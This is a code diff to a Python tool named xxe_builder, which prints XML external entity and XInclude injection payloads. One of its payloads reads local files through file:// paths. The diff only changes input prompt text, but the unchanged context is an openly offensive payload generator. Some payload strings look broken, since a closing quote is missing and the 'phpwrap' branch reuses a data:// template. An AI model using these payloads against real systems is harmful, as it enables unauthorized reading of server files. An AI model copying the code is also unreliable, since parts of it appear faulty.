@@ -20,15 +20,15 @@ class xxe_builder:
             final = text + ']>'
             print(final)
         elif self.__motive == "base64":
-            base64_content=input("insert base64 content")
+            base64_content=input("insert base64 content: ")
             text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM  "data://text/plain;base64 {} >]>'.format(str(self.__entity),str(base64_content))
             print(text)
         elif self.__motive == "phpwrap":
-            php_filter = input("insert php filter command:")
+            php_filter = input("insert php filter command: ")
             text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM  "data://text/plain;base64 {} >]>'.format(str(self.__entity),str(php_filter))
             print(text)
         elif self.__motive == "xinclude":
-            xinclude_file=input("insert the path of the file you want to search")
+            xinclude_file=input("insert the path of the file you want to search: ")
             xinclude_header='<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
             xinclude_command='<xi:include parse="text" href="file://{}"/></foo>'.format(str(xinclude_file))
             print(xinclude_header)
